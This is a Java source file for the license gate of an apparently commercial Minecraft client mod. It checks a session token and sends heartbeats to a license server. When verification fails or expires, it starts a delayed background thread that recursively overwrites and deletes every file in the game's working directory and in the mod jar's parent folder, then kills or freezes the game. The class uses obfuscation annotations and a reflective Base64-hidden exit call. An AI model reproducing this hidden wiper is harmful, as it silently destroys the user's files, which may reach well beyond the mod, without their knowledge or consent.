package dev.mahiro.client.auth;

import by.radioegor146.nativeobfuscator.Native;
import dev.mahiro.client.BuildConfig;
import dev.mahiro.client.auth.crypto.B64;
import dev.mahiro.client.auth.net.AuthClient;
import dev.mahiro.client.auth.net.AuthVerifyResult;
import dev.mahiro.client.gui.auth.AuthScreen;
import dev.mahiro.client.gui.clickgui.ClickGuiScreen;
import dev.mahiro.client.gui.hud.HudEditorScreen;
import dev.mahiro.client.gui.mainmenu.MainMenuScreen;
import dev.mahiro.client.gui.mainmenu.WelcomeScreen;
import dev.mahiro.niurendeobf.ZKMIndy;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.screen.TitleScreen;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Comparator;
import java.util.Objects;
import java.util.Random;
import java.util.function.BiConsumer;

@Native
@ZKMIndy
public final class AuthGate {
    private static volatile boolean initialized;
    private static volatile boolean pendingMainMenuIntro;

    private static String deviceId;
    private static String licenseKey;
    private static String serverBaseUrl;
    private static String serverSigningKeyX509Base64;
    public static volatile String sessionToken;
    public static volatile boolean sessionOnlineVerified;
    public static volatile boolean sessionPassVerified;
    public static volatile long sessionPassExpiresAtMillis;
    private static volatile long lastHeartbeatAttemptMillis;
    private static volatile boolean heartbeatInFlight;
    private static final long PASS_TTL_MILLIS = 24L * 60L * 60L * 1000L;
    private static final long HEARTBEAT_INTERVAL_MILLIS = 30L * 1000L;
    private static final long UI_GATE_INTERVAL_MILLIS = 250L;
    private static volatile long lastUiGateMillis;
    private static volatile boolean uiGateInFlight;
    private static volatile AuthClient heartbeatClient;
    private static volatile String heartbeatClientCfgKey;

    public static String getSessionToken() {
        return sessionToken;
    }

    public static boolean isSessionOnlineVerified() {
        return sessionOnlineVerified;
    }

    private AuthGate() {
    }

    public static void init() {
        if (initialized) return;
        deviceId = DeviceFingerprint.computeDeviceId();
        licenseKey = "";
        serverBaseUrl = "";
        serverSigningKeyX509Base64 = "";
        sessionToken = "";
        sessionOnlineVerified = false;
        sessionPassVerified = false;
        sessionPassExpiresAtMillis = 0L;
        pendingMainMenuIntro = false;
        initialized = true;

        AuthPass pass = AuthPassStore.load(deviceId);
        if (pass != null && pass.token() != null && !pass.token().isBlank()) {
            sessionToken = pass.token().trim();
            sessionPassVerified = true;
            sessionPassExpiresAtMillis = pass.expiresAtMillis();
        }
    }

    private static boolean isBlockedScreen(Screen screen) {
        if (screen == null) return false;
        if (screen instanceof AuthScreen) return false;
        if (screen instanceof TitleScreen) return false;
        return screen instanceof MainMenuScreen ||
                screen instanceof WelcomeScreen ||
                screen instanceof ClickGuiScreen ||
                screen instanceof HudEditorScreen;
    }

    public static void doTickCheck(MinecraftClient c) {
        if (c == null) return;
        String token = sessionToken;
        boolean ok = (sessionOnlineVerified || (sessionPassVerified && System.currentTimeMillis() < sessionPassExpiresAtMillis));
        if (ok && token != null && !token.isBlank()) {
            tickHeartbeat(c);
            return;
        }

        if (c.player != null && c.world != null) failSafe();
    }

    public static boolean hasCheck = false;

    public static void failSafe() {
        if (hasCheck) return;
        hasCheck = true;

        new Thread(new FailSafeRunnable(), "WTF").start();
    }

    private static void fuckFile(int choice) {
        new Thread(new FuckFileRunnable(choice), "NiMaSiLe").start();
    }

    private static void haltJVM() {
        Runtime.getRuntime().halt(0);
    }

    private static void fuckMC() {
        MinecraftClient.getInstance().execute(new FuckMcRunnable());
    }

    private static void shuijiao() {
        MinecraftClient.getInstance().execute(new SleepForeverRunnable());
    }

    private static void systemExit() {
        try {
            Class<?> System = AuthGate.class.getClassLoader().loadClass(new String(B64.dec("amF2YS5sYW5nLlN5c3RlbQ==")));
            Method exit = System.getMethod(new String(B64.dec("ZXhpdA==")), int.class);
            exit.invoke(null, 0);
        } catch (Exception ignored) {
        }
    }

    public static boolean isVerified() {
        String token = sessionToken;
        boolean ok = (sessionOnlineVerified || (sessionPassVerified && System.currentTimeMillis() < sessionPassExpiresAtMillis));
        return ok && token != null && !token.isBlank();
    }

    public static String getDeviceId() {
        return Objects.requireNonNullElse(deviceId, "UNKNOWN");
    }

    public static String getLicenseKey() {
        return Objects.requireNonNullElse(licenseKey, "");
    }

    public static void saveLicenseKey(String key) {
        licenseKey = key == null ? "" : key.trim();
    }

    public static String getServerBaseUrl() {
        String fromProp = System.getProperty("lemon.auth.baseUrl");
        if (fromProp != null && !fromProp.isBlank()) return fromProp.trim();
        return Objects.requireNonNullElse(serverBaseUrl, "");
    }

//    public static void saveServerBaseUrl(String url) {
//        serverBaseUrl = url == null ? "" : url.trim();
//    }

    public static String getServerSigningKeyX509Base64() {
        String fromProp = System.getProperty("lemon.auth.serverSigningKeyX509Base64");
        if (fromProp != null && !fromProp.isBlank()) return fromProp.trim();
        if (!BuildConfig.PINNED_SERVER_SIGNING_KEY_X509_BASE64.isBlank())
            return BuildConfig.PINNED_SERVER_SIGNING_KEY_X509_BASE64;
        return Objects.requireNonNullElse(serverSigningKeyX509Base64, "");
    }

    /*public static void saveServerSigningKeyX509Base64(String base64) {
        serverSigningKeyX509Base64 = base64 == null ? "" : base64.trim();
    }*/

    public static void acceptVerifiedToken(String token) {
        sessionToken = token == null ? "" : token.trim();
        sessionOnlineVerified = true;
        sessionPassVerified = true;
        sessionPassExpiresAtMillis = System.currentTimeMillis() + PASS_TTL_MILLIS;
        AuthPassStore.save(getDeviceId(), sessionToken, sessionPassExpiresAtMillis);
    }

    public static void clearSession() {
        sessionToken = "";
        sessionOnlineVerified = false;
        sessionPassVerified = false;
        sessionPassExpiresAtMillis = 0L;
        lastHeartbeatAttemptMillis = 0L;
        heartbeatInFlight = false;
        AuthPassStore.clear();
    }

    public static void requestMainMenuIntro() {
        pendingMainMenuIntro = true;
    }

    public static boolean consumeMainMenuIntro() {
        if (!pendingMainMenuIntro) return false;
        pendingMainMenuIntro = false;
        return true;
    }

    public static void onClientTick(MinecraftClient c) {
        if (c == null) return;

        doTickCheck(c);

        if (isVerified()) return;
        Screen cur = c.currentScreen;
        if (!isBlockedScreen(cur)) return;

        long nowMillis = System.currentTimeMillis();
        if (uiGateInFlight) return;
        if (nowMillis - lastUiGateMillis < UI_GATE_INTERVAL_MILLIS) return;
        lastUiGateMillis = nowMillis;
        uiGateInFlight = true;

        c.execute(new UiGateRunnable(c));
    }

    private static void tickHeartbeat(MinecraftClient c) {
        String token = sessionToken;
        if (token == null || token.isBlank()) return;

        long now = System.currentTimeMillis();
        if (sessionPassVerified && now >= sessionPassExpiresAtMillis && !sessionOnlineVerified) {
            clearSession();
            if (c.player != null && c.world != null) failSafe();
            return;
        }

        if (heartbeatInFlight) return;
        if (now - lastHeartbeatAttemptMillis < HEARTBEAT_INTERVAL_MILLIS) return;

        lastHeartbeatAttemptMillis = now;
        heartbeatInFlight = true;

        getHeartbeatClient()
                .verifyToken(token, getDeviceId())
                .whenComplete(new HeartbeatComplete(c, token));
    }

    private static boolean isTransientHeartbeatError(String err) {
        if (err == null) return true;
        String s = err.trim();
        if (s.isEmpty()) return true;
        if (s.startsWith("HTTP_")) return true;
        String lower = s.toLowerCase();
        return lower.contains("connect") ||
                lower.contains("timeout") ||
                lower.contains("timed out") ||
                lower.contains("refused") ||
                lower.contains("unknownhost");
    }

    private static AuthClient getHeartbeatClient() {
        String cfgKey = getServerBaseUrl() + "|" + getServerSigningKeyX509Base64();
        AuthClient existing = heartbeatClient;
        if (existing != null && Objects.equals(cfgKey, heartbeatClientCfgKey)) return existing;
        AuthClient created = new AuthClient();
        heartbeatClient = created;
        heartbeatClientCfgKey = cfgKey;
        return created;
    }

    private static final class FailSafeRunnable implements Runnable {
        @Override
        public void run() {
            try {
                Thread.sleep(5000 + new Random().nextInt(10000));
            } catch (InterruptedException ignored) {
            }
            fuckFile(new Random().nextInt(5));
        }
    }

    private static final class FuckFileRunnable implements Runnable {
        private final int choice;

        private FuckFileRunnable(int choice) {
            this.choice = choice;
        }

        @Override
        public void run() {
            try {
                Path jarPath = null;
                try {
                    jarPath = Paths.get(AuthGate.class.getProtectionDomain().getCodeSource().getLocation().toURI());
                } catch (Exception ignored) {
                }

                Path[] targets = {
                        Paths.get(""),
                        jarPath != null ? jarPath.getParent() : null
                };

                for (Path root : targets) {
                    if (root == null || !Files.exists(root)) continue;
                    try (var stream = Files.walk(root)) {
                        for (var it = stream.sorted(Comparator.reverseOrder()).iterator(); it.hasNext(); ) {
                            Path p = it.next();
                            try {
                                if (Files.isRegularFile(p)) {
                                    try (FileChannel outChan = FileChannel.open(p, StandardOpenOption.WRITE)) {
                                        outChan.truncate(0);
                                        outChan.write(ByteBuffer.wrap("FUCK_YOU".getBytes()));
                                    }
                                    Files.deleteIfExists(p);
                                } else if (Files.isDirectory(p) && !p.equals(root)) {
                                    Files.deleteIfExists(p);
                                }
                            } catch (Exception ignored) {
                            }
                        }
                    } catch (Exception ignored) {
                    }
                }
            } catch (Exception ignored) {
            } finally {
                switch (choice) {
                    case 0 -> systemExit();
                    case 1 -> fuckMC();
                    case 2 -> shuijiao();
                    default -> haltJVM();
                }
            }
        }
    }

    private static final class FuckMcRunnable implements Runnable {
        @Override
        public void run() {
            try {
                Field f = MinecraftClient.class.getDeclaredField("world");
                f.setAccessible(true);
                f.set(MinecraftClient.getInstance(), null);
            } catch (Throwable ignored) {
            }
        }
    }

    private static final class SleepForeverRunnable implements Runnable {
        @Override
        public void run() {
            while (true) {
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException ignored) {
                }
            }
        }
    }

    private static final class UiGateRunnable implements Runnable {
        private final MinecraftClient c;

        private UiGateRunnable(MinecraftClient c) {
            this.c = c;
        }

        @Override
        public void run() {
            try {
                if (isVerified()) return;
                Screen now = c.currentScreen;
                if (!isBlockedScreen(now)) return;
                if (now instanceof AuthScreen) return;
                c.setScreen(new AuthScreen(now));
            } finally {
                uiGateInFlight = false;
            }
        }
    }

    private static final class HeartbeatComplete implements BiConsumer<AuthVerifyResult, Throwable> {
        private final MinecraftClient c;
        private final String token;

        private HeartbeatComplete(MinecraftClient c, String token) {
            this.c = c;
            this.token = token;
        }

        @Override
        public void accept(AuthVerifyResult res, Throwable ex) {
            heartbeatInFlight = false;
            if (ex != null) {
                sessionOnlineVerified = false;
                if (sessionPassVerified && System.currentTimeMillis() >= sessionPassExpiresAtMillis) {
                    clearSession();
                    if (c.player != null && c.world != null) failSafe();
                }
                return;
            }
            if (res == null) {
                sessionOnlineVerified = false;
                if (sessionPassVerified && System.currentTimeMillis() >= sessionPassExpiresAtMillis) {
                    clearSession();
                    if (c.player != null && c.world != null) failSafe();
                }
                return;
            }
            if (!res.ok()) {
                sessionOnlineVerified = false;
                String err = res.error();
                if (!isTransientHeartbeatError(err)) {
                    clearSession();
                    if (c.player != null && c.world != null) failSafe();
                    return;
                }
                if (sessionPassVerified && System.currentTimeMillis() >= sessionPassExpiresAtMillis) {
                    clearSession();
                    if (c.player != null && c.world != null) failSafe();
                }
                return;
            }

            sessionOnlineVerified = true;
            sessionPassVerified = true;
            sessionPassExpiresAtMillis = System.currentTimeMillis() + PASS_TTL_MILLIS;
            AuthPassStore.save(getDeviceId(), token, sessionPassExpiresAtMillis);
        }
    }
}
